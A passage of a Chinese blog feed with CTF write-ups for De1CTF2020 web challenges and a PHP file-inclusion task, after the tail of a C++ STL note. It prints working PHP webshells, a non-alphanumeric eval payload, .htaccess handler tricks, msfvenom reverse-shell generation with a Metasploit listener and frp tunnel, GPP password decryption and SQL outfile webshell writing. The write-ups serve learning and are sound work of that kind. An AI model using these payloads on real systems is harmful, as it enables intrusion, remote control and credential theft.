alt="image-20200509212400596"></p><p>put第三个</p><p><img src="/images/image-20200509212457340.png" alt="image-20200509212457340"></p><p>从上面就能分析得出</p><p>第一个和第二个是维持数据的访问范围，而第三个就是一个边界</p><p>每当第二指针==第三个的时候就就会扩容，但这个扩容的过程是整内存复制过去的。</p><p>vector ： vector和built-in数组类似，拥有一段连续的内存空间，能非常好的支持随即存取，即[]操作符，但由于它的内存空间是连续的，所以在中间进行插入和删除会造成内存块的拷贝，另外，当插入较多的元素后，预留内存空间可能不够，需要重新申请一块足够大的内存并把原来的数据拷贝到新的内存空间。</p><p>list：      list就是数据结构中的双向链表(根据sgi stl源代码)，因此它的内存空间是不连续的，通过指针来进行数据的访问，这个特点使得它的随即存取变的非常没有效率，因此它没有提供[]操作符的重载。但由于链表的特点，它可以以很好的效率支持任意地方的删除和插入。</p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="C++" scheme="https://leave-Devour.github.io/categories/C/"/>
    
    
      <category term="STL分析" scheme="https://leave-Devour.github.io/tags/STL%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>De1CTF2020 web复现</title>
    <link href="https://leave-devour.github.io/2020/05/07/De1CTF2020-web%E5%A4%8D%E7%8E%B0/"/>
    <id>https://leave-devour.github.io/2020/05/07/De1CTF2020-web%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-05-07T15:56:33.000Z</published>
    <updated>2020-05-07T17:40:34.912Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>太难了。。看这别人的wp也要请教很多很多师傅才弄懂</p><h2 id="1、check-in"><a href="#1、check-in" class="headerlink" title="1、check in"></a>1、check in</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一道文件上传题目</p><p><img src="/images/image-20200508012923782.png" alt="image-20200508012923782"></p><p><img src="/images/image-20200508013252030.png" alt="image-20200508013252030"></p><p>这里有三种判断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type</span><br><span class="line">Filename </span><br><span class="line">File content</span><br><span class="line">在内容错误的时候会爆出</span><br><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</span><br></pre></td></tr></table></figure><p>然后就是考察 .htaccess文件上传</p><p>.htaceess是apache上面的一个配置文件，可以设置403跳转页面或者后缀执行之类的</p><p><a href="https://httpd.apache.org/docs/2.4/howto/htaccess.html#cgi" target="_blank" rel="noopener">https://httpd.apache.org/docs/2.4/howto/htaccess.html#cgi</a></p><p>这里有两种解法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、cgi执行</span><br><span class="line">cgi比较严格什么系统就在什么系统编写好再上传，不然无法解析</span><br><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script.sam</span><br><span class="line">#! /bin/bash</span><br><span class="line"></span><br><span class="line">echo Content-type: text/html</span><br><span class="line">ls -lah /</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">cat /flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、x-httpd-php .后缀</span><br><span class="line">AddType application/x-httpd-php .eee</span><br><span class="line">或许用\绕过</span><br><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .eee</span><br><span class="line"></span><br><span class="line">&lt;?=eval($_POST[0]);  ---&gt; &lt;?php echo eval($_POST[0]);</span><br><span class="line">&lt;?=&apos;cat /flag&apos;;</span><br><span class="line">&lt;?=  ---&gt; &lt;? echo </span><br><span class="line">&lt;?=eval($_POST[&apos;y1ng&apos;]);</span><br><span class="line">能够把 .eee 解析成php 然后执行</span><br></pre></td></tr></table></figure><h2 id="2、Hard-Pentest-1"><a href="#2、Hard-Pentest-1" class="headerlink" title="2、Hard_Pentest_1"></a>2、Hard_Pentest_1</h2><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目给的网址，然后看到题目就知道要搞渗透了，但是渗透是什么？？？鬼知道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.113.219.76/</span><br></pre></td></tr></table></figure><p>访问链接得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Clear the uploads directory every hour</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$sandbox = <span class="string">"uploads/"</span>. md5(<span class="string">"De1CTF2020"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">"submit"</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not Allow!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span><br></pre></td></tr></table></figure><p>要能执行到这样，要绕过前面的判断<code>($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0</code></p><p>其实最主要的还是 <code>Check()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面有个正则，和后缀检测</p><p>这个后缀可以大写绕过 比如 <code>Php</code></p><p>然后这个正则 ，可以用++绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&apos;/[a-z0-9;~^`&amp;|]/is&apos;,$file_content)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符</span><br><span class="line">然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可</span><br><span class="line"></span><br><span class="line">php5和7的差异。</span><br><span class="line">php5中assert是一个函数，我们可以通过$f=&apos;assert&apos;;$f(...);这样的方法来动态执行任意代码。</span><br><span class="line">但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</span><br><span class="line"></span><br><span class="line">利用位运算</span><br><span class="line">比如  &quot;x&quot; ^&quot;x&quot; =&quot;X&quot;</span><br><span class="line">取反</span><br><span class="line">比如 ~“A” =&gt; &quot;x&quot;</span><br><span class="line">利用自增运算符</span><br><span class="line">比如 “A”++ =&gt; &quot;B&quot;</span><br></pre></td></tr></table></figure><p>这题可以用 （:抄的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=</span><br><span class="line">@$_=[].<span class="string">''</span>,</span><br><span class="line">@$__=$_[<span class="string">''</span>],</span><br><span class="line">$___=<span class="string">''</span>,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$___.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$___.=$_,</span><br><span class="line">$____=<span class="string">'_'</span>,$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,</span><br><span class="line">$_=$__,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$_++,$____.=$_,</span><br><span class="line">$_=$$____,$___($_[_]) <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?</span>= SYSTEM($_POST[_]) <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>然后再执行这个，post</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=echo &quot;&lt;?php eval($_REQUEST[cmd]); ?&gt;&quot; &gt; 1.php</span><br></pre></td></tr></table></figure><p>生成了1.php就能用蚁剑连接</p><p>提示了flag不在web服务器，那就用msf连上去，但因为靶机在公网，而我本地不在公网，这时候我知道的有两种方法，其实都是差不多的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、在自己的vps上面安装msf</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \chmod 755 msfinstall &amp;&amp; \./msfinstall</span><br><span class="line">然后再用</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=10002 -f exe &gt; remoteevil.exe</span><br><span class="line">生成一个windows的反弹shell</span><br><span class="line">然后就开始用msf监听反弹shell发来的请求</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost vps的地址</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br><span class="line">然后就把 remoteevil.exe 用蚁剑传到 靶机上面，然后运行</span><br><span class="line">然后msf就连接上了</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">2、是用内网穿透工具frp作为代理，来接收反弹回来的shell</span><br><span class="line">frp：https://github.com/fatedier/frp/releases</span><br><span class="line">然后服务器端 配置frps.ini</span><br><span class="line">[common]</span><br><span class="line">bind_port = 10001</span><br><span class="line"></span><br><span class="line">客户端 frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = xxx.xxx.xxx.xxx  服务器的ip</span><br><span class="line">server_port = 10001 </span><br><span class="line"></span><br><span class="line">[msf]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1 本地地址，老高说用0.0.0.0 比较好</span><br><span class="line">local_port = 4444 这个是本地msf监听的端口</span><br><span class="line">remote_port = 10002  frps将通过vps的这个端口监听靶机的流量</span><br><span class="line"></span><br><span class="line">然后就是先运行</span><br><span class="line">frps -c frps.ini</span><br><span class="line">然后</span><br><span class="line">frpc -c frpc.ini</span><br><span class="line">然后再</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 127.0.0.1或者0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br><span class="line">然后就直接运行蚁剑上面的反弹shell</span><br></pre></td></tr></table></figure><p>要注意的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">首先 vps的防火墙，有需要的话。。要关点</span><br><span class="line">然后 服务器的端口要开着，要在啊里云控制台管理那，安全组策略那里，然后添加端口</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200508003350572.png" alt="image-20200508003350572"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">下面记录下一些msf的操作。以后说不定忘了</span><br><span class="line">先进shell</span><br><span class="line">然后 查看域里面的用户 net user /domain </span><br><span class="line">然后 net use 用户 应该是跟域里面某个用户建立连接</span><br><span class="line">然后 net view net view 查看网内开启了哪些共享</span><br><span class="line">然后可以  dir下共享的目录里有有什么</span><br><span class="line"></span><br><span class="line">返回到 meterpreter的时候可以下载</span><br><span class="line"></span><br><span class="line">download 文件的路径 /保存的路径</span><br></pre></td></tr></table></figure><p>gpp漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">set session id</span><br><span class="line">run</span><br><span class="line">得到加密后的里面</span><br><span class="line">然后再用 https://github.com/Cyclical-/GPPDecryption 里面的脚本解密</span><br></pre></td></tr></table></figure><p>最后得到</p><p><img src="/images/image-20200508012646386.png" alt="image-20200508012646386"></p><p><img src="/images/image-20200508012716472.png" alt="image-20200508012716472"></p><p>请参考p神的两篇文章。</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">1</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">2</a></p><p>多谢 Mustapha Mond师傅，老高，和Y1ng师傅的指导 </p><p><a href="https://www.cnblogs.com/20175211lyz/p/12839549.html" target="_blank" rel="noopener">Mustapha Mond</a></p><p><a href="https://www.gem-love.com/ctf/2302.html" target="_blank" rel="noopener">Y1ng</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://leave-Devour.github.io/categories/web/"/>
    
    
      <category term="复现" scheme="https://leave-Devour.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>一道题学习文件包含</title>
    <link href="https://leave-devour.github.io/2020/05/06/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://leave-devour.github.io/2020/05/06/%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-05-06T07:09:03.000Z</published>
    <updated>2020-05-06T11:02:08.974Z</updated>
    
    <content type="html"><![CDATA[<center><font size="5">info</font></center><a id="more"></a><p>一道文件包含的题目，大多数解答都参照别人做的，记录下学习文件包含的笔记</p><h2 id="1、Web-php-include"><a href="#1、Web-php-include" class="headerlink" title="1、Web_php_include"></a>1、Web_php_include</h2><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p> 请求页面</p><p><img src="/images/image-20200506151050599.png" alt="image-20200506151050599"></p><p>有个过滤，过滤掉<code>php://</code> ,然后把page包含进来</p><h4 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h4><p>strstr是大小写敏感的，可以利用大小写绕过这个过滤比如 PHP://</p><p>绕过成功后可以利用PHP://input 命令执行,要注意的是这个php的伪协议是用post传数据的</p><p><img src="/images/image-20200506151821030.png" alt="image-20200506151821030"></p><p>既然能够执行命令了，那可以直接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> system(<span class="string">"cat fl4gisisish3r3.php"</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> file_get_contents(<span class="string">"fl4gisisish3r3.php"</span>);<span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//124.126.19.106:46927/?page=PHP://filter/read/convert.base64-encode/resource=fl4gisisish3r3.php</span></span><br><span class="line">http:<span class="comment">//124.126.19.106:46927/?page=PHP://filter/convert.base64-encode/resource=fl4gisisish3r3.php</span></span><br></pre></td></tr></table></figure><p>或者写shell连上去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是这个这道题没写不上去， allow_url_fopen 和 allow_url_include都开着，但是php的版本没有小于 5.3.0</p><h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>在用御剑扫后台的时候发现后台有</p><p><img src="/images/image-20200506153855547.png" alt="image-20200506153855547"></p><p>存在phpadmin</p><p>好玩的是。。。。直接root就登进去了</p><p>然后往执行mysql语法写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="string">"&lt;?php @eval($_POST['cmd']);?&gt;"</span><span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/tmp/shell.php'</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200506155039772.png" alt="image-20200506155039772"></p><p>flag 在www目录下面</p><h4 id="第三种是利用其它的伪协议"><a href="#第三种是利用其它的伪协议" class="headerlink" title="第三种是利用其它的伪协议"></a>第三种是利用其它的伪协议</h4><p>data://</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,&lt;?php print_r(scandir(&quot;/var/www&quot;));?&gt;</span><br><span class="line">也可以传马</span><br><span class="line">data://text/plain;base64,后面的base64加密的马</span><br></pre></td></tr></table></figure><p>小结下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&apos;DOCUMENT_ROOT&apos;];</span><br><span class="line">保存着 目录路径</span><br><span class="line"></span><br><span class="line">php:// 输入输出流</span><br><span class="line">PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</span><br><span class="line"></span><br><span class="line">php://filter（本地磁盘文件进行读取）</span><br><span class="line">元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写。</span><br><span class="line">用法：?filename=php://filter/convert.base64-encode/resource=xxx.php ?filename=php://filter/read=convert.base64-encode/resource=xxx.php 一样。</span><br><span class="line">条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</span><br><span class="line"></span><br><span class="line">php://input</span><br><span class="line">可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</span><br><span class="line">用法：?file=php://input 数据利用POST传过去。</span><br><span class="line"></span><br><span class="line">php://input （读取POST数据）</span><br><span class="line">碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</span><br><span class="line"></span><br><span class="line">php://input（写入木马）</span><br><span class="line">测试代码：</span><br><span class="line">条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行。</span><br><span class="line"></span><br><span class="line">如果POST的数据是执行写入一句话木马的PHP代码，就会在当前目录下写入一个木马。</span><br><span class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;);?&gt;</span><br><span class="line"></span><br><span class="line">php://input（命令执行）</span><br><span class="line">条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</span><br></pre></td></tr></table></figure><p>其他伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 